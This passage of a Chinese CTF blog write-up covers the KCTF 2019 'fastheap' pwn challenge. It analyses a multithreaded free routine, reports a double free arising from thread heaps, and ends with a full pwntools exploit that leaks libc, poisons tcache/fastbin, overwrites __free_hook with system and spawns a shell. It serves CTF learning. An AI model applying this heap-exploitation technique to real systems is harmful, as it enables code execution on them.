class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = v3 ^ v4;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == v4 )</span><br><span class="line">    result = my_read(heap_list[idx], size);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>fast free要求输入一个索引范围，然后创建线程来进行堆块的释放，用户可以控制线程的数量，最多为8个，释放后清空bss段对应的堆指针，如果线程为0就不会释放直接清空heap_list。<br>在start_routine中有这么一段代码来保证只有一个线程对指定堆块进行释放。start_routine传入的参数是a1是end_index，a1+8正好是start_index的位置，在汇编中lock xadd是交换两个操作数的值，然后相加，结果就是start_index++,v2是start_index的初始值，只有当原始的start_index &lt; end_index时，才进行堆块的释放。因为每次start_index++是一个原子操作，从而保证只有一个线程对堆块进行释放。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">unsigned</span> __int8)_InterlockedExchangeAdd8((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int8 *)a1 + <span class="number">8</span>, <span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)a1 &lt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !heap_list[v2] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_list[v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000C6F loc_C6F:                                ; CODE XREF: start_routine+1D↑j</span><br><span class="line">.text:0000000000000C6F                 mov     eax, 1</span><br><span class="line">.text:0000000000000C74                 lock xadd [rbx], al   //交换操作数，相加，start_index++</span><br><span class="line">.text:0000000000000C78                 movzx   eax, al</span><br><span class="line">.text:0000000000000C7B                 mov     [rsp+28h+var_28], rax</span><br><span class="line">.text:0000000000000C7F                 mov     rax, [rsp+28h+var_28]</span><br><span class="line">.text:0000000000000C83                 cmp     [rbp+0], rax //比较end_index和未加1的start_index</span><br><span class="line">.text:0000000000000C87                 ja      short loc_C50 //当start_index &lt; end_index时才进行free</span><br><span class="line">.text:0000000000000C89                 xor     eax, eax</span><br><span class="line">.text:0000000000000C8B                 mov     rcx, [rsp+28h+var_20]</span><br><span class="line">.text:0000000000000C90                 xor     rcx, fs:28h</span><br><span class="line">.text:0000000000000C99                 jnz     short loc_CAC</span><br><span class="line">.text:0000000000000C9B                 add     rsp, 18h</span><br><span class="line">.text:0000000000000C9F                 pop     rbx</span><br><span class="line">.text:0000000000000CA0                 pop     rbp</span><br><span class="line">.text:0000000000000CA1                 retn</span><br></pre></td></tr></table></figure>
+<p>这样保证只有一个线程会释放指定的堆块。不会导致双重释放（开始是这样认为的，但是后来的确出现了double free…）<br>show函数会判断对应的heap_list是否非空，不能UAF。</p>
+<h2 id="线程堆"><a href="#线程堆" class="headerlink" title="线程堆"></a>线程堆</h2><p>这里涉及到了线程堆的知识，第一次遇到这种题目，这次还是主进程分配，线程释放堆块。ptmalloc使用mmap()函数为线程创建自己的非主分配区来模拟堆(sub_heap)，当该sub_heap用完之后，会再使用mmap()分配一块新的内存块作为sub_heap。当进程中有多个线程时，一定也有多个分配区，但是每个分配区都有可能被多个线程使用。具体关于线程堆的知识可以看<a href="http://p4nda.top/2018/03/15/n1ctf2018/" target="_blank" rel="noopener">这篇博客</a>。<br>另外这道题目有一个至今没有明白的点，当线程释放完指定堆块还没有退出时，堆块是进入了进程的tcache，但是当线程退出后，这个堆块就进入了主进程的对应的fastbin。比如，申请一个0x70和0x30的堆块，释放idx0，释放之前堆块的状态：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ parseheap </span><br><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line"><span class="number">0x55c118339000</span>      <span class="number">0x0</span>                 <span class="number">0x250</span>                Used                <span class="keyword">None</span>              <span class="keyword">None</span></span><br><span class="line"><span class="number">0x55c118339250</span>      <span class="number">0x0</span>                 <span class="number">0x70</span>                 Used                <span class="keyword">None</span>              <span class="keyword">None</span></span><br><span class="line"><span class="number">0x55c1183392c0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                <span class="keyword">None</span>              <span class="keyword">None</span></span><br></pre></td></tr></table></figure></p>
+<p>释放idx0,workers=1，在free下断点，finish完成后堆块进线程的tcache。<br><img src="/2019/06/23/KCTF2019-Q2部分pwn题/1.png" alt="1"><br>线程退出后，该堆块在fastbin中：<br><img src="/2019/06/23/KCTF2019-Q2部分pwn题/2.png" alt="2"><br>对线程堆的知识了解太少了，不知道是什么原因，猜测是因为线程的非主分配区复用导致的。希望可以看其他大佬的wp学习一波。</p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>由于有tcache，只要能构造出double free，由于tcache在分配时没有对tcache链中的chunk进行size的检查，所以就可以fd指向malloc_hook或free_hook。但这道题目堆heap_list进行了清空，不能double free。但是感觉线程这里肯定有问题，在和队友的多次尝试后发现创建多个堆块，然后都释放掉，竟然出现了double free:<br><img src="/2019/06/23/KCTF2019-Q2部分pwn题/3.png" alt="3"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">250</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="number">250</span>,<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p>
+<p>出现了double free应该就能利用了吧，但是还缺少libc。本来想着先在申请这250个堆块之前先申请两个堆块（大小分别为0x70和0xa0）试一下，想办法泄露libc，但是发现没有对这两个块进行释放，free完那250个堆块后，0x70的堆块idx0进入了fastbin，0xb0的堆块idx1进入了unsortedbin了。这…利用条件都具备了，直接show(1)就可以泄露libc。<br><img src="/2019/06/23/KCTF2019-Q2部分pwn题/4.png" alt="4"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">250</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">252</span>,<span class="number">7</span>)</span><br></pre></td></tr></table></figure></p>
+<p>但是当试图再次申请tcache里的这250个堆块时，发现只要申请到第248个堆块时，bins的分布如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(0x70)     fastbin[5]: 0x5555557576f0 --&gt; 0x555555757680 --&gt; 0x555555757610 --&gt; 0x555555757370 --&gt; 0x7ffff7bb0c0d (size error (0x78)) --&gt; 0xfff785c410000000 (invaild memory)</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x55555575e8b0</span> (size : <span class="number">0x19750</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x5555557572c0</span> (size : <span class="number">0xb0</span>)</span><br><span class="line">(0x120)   tcache_entry[16](3): 0x55555575e320 --&gt; 0x55555575e200 --&gt; 0x55555575e0e0</span><br></pre></td></tr></table></figure></p>
+<p>再试图分配第249个块时，就直接越过了fastbin里的前5个chunk，去分配0xfff785c410000000这个堆块，前5个堆块进入了tcache：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0xfff785c410000000</span> (invaild memory)</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x55555575e8b0</span> (size : <span class="number">0x19750</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x5555557572c0</span> (size : <span class="number">0xb0</span>)</span><br><span class="line">(0x70)   tcache_entry[5](4): 0x7ffff7bb0c1d --&gt; 0x555555757380 --&gt; 0x555555757620 --&gt; 0x555555757690</span><br><span class="line">(0x120)   tcache_entry[16](3): 0x55555575e320 --&gt; 0x55555575e200 --&gt; 0x55555575e0e0</span><br></pre></td></tr></table></figure></p>
+<p>没法利用这250个堆块的double free，但是可以利用前2个堆块未释放就进入unsorted bin的状态进行double free。</p>
+<p>首先申请两个堆块和250个堆块，释放250个，起7个线程，idx0进入fastbin中，idx1进入unsortedbin中。show(1)泄露libc。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">250</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">252</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"__malloc_hook"</span>] - <span class="number">0x70</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br></pre></td></tr></table></figure></p>
+<p>此时bins的分布如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(0x70)     fastbin[5]: 0x555555757250 --&gt; 0x555555757370 --&gt; ...-&gt; 0x555555757370 (overlap chunk with 0x555555757370(freed) )</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x55555575e8b0</span> (size : <span class="number">0x19750</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x5555557572c0</span> (size : <span class="number">0xb0</span>)</span><br><span class="line">(0x120)   tcache_entry[16](3): 0x55555575e320 --&gt; 0x55555575e200 --&gt; 0x55555575e0e0</span><br></pre></td></tr></table></figure></p>
+<p>当再次分配0x60的堆块时，会先从unsorted bin中取出堆块，再从fastbin中分配，idx0和idx2的地址相同，可以进行double free。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>查看heap_list如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">8</span>gx <span class="number">0x0000555555554000</span>+<span class="number">0x202060</span></span><br><span class="line"><span class="number">0x555555756060</span>: <span class="number">0x0000555555757260</span>  <span class="number">0x00005555557572d0</span></span><br><span class="line"><span class="number">0x555555756070</span>: <span class="number">0x0000555555757260</span>  <span class="number">0x000055555575e070</span></span><br><span class="line"><span class="number">0x555555756080</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756090</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p>后面就是double free，但是在double free时，tcache 0x70中又出现了6个堆块，就很神奇，要先把tcache清空之后才能分配fastbin里的堆块。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>tcache 0x70中有6个堆块：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(0x70)     fastbin[5]: 0x555555757250 --&gt; 0x55555575e060 --&gt; 0x555555757250 (overlap chunk with 0x555555757250(freed) )</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x55555575e8b0</span> (size : <span class="number">0x19750</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x5555557572c0</span> (size : <span class="number">0xb0</span>)</span><br><span class="line">(0x70)   tcache_entry[5](6): 0x5555557575b0 --&gt; 0x555555757540 --&gt; 0x5555557574d0 --&gt; 0x555555757460 --&gt; 0x5555557573f0 --&gt; 0x555555757380</span><br><span class="line">(0x120)   tcache_entry[16](3): 0x55555575e320 --&gt; 0x55555575e200 --&gt; 0x55555575e0e0</span><br></pre></td></tr></table></figure></p>
+<p>最后修改free_hook为system，释放一个写有”/bin/sh\x00”的块，这里再修改地址完成之后，是手动输入进行堆块idx11的删除触发system(“/bin/sh”)的，最后get shell。因为在tcache清空之后，fastbin的堆块进入了tcache中，因此free_hook才能避过fastbin中size的检查，分配并修改成功。<br>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    p = process(<span class="string">"./fastheap"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"152.136.18.34"</span>,<span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Contents: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(start,end,worker)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index range: "</span>)</span><br><span class="line">    p.sendline(str(start)+<span class="string">'-'</span>+str(end))</span><br><span class="line">    p.recvuntil(<span class="string">"Number of workers: "</span>)</span><br><span class="line">    p.sendline(str(worker))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">250</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">252</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"__malloc_hook"</span>] - <span class="number">0x70</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##double free</span></span><br><span class="line">delete(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##empty tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">   add(i+<span class="number">2</span>,<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##free_hook-&gt;system</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">##manual trigger</span></span><br><span class="line">delete(<span class="number">11</span>,<span class="number">12</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>知识有限，这篇wp只是记录了做题的过程，感觉这道题有太多神奇的地方，做出这道题也是凭运气好，希望大佬们指点。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://p4nda.top/2018/03/15/n1ctf2018/" target="_blank" rel="noopener">http://p4nda.top/2018/03/15/n1ctf2018/</a><br><a href="https://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>
+
+      
+    </div>
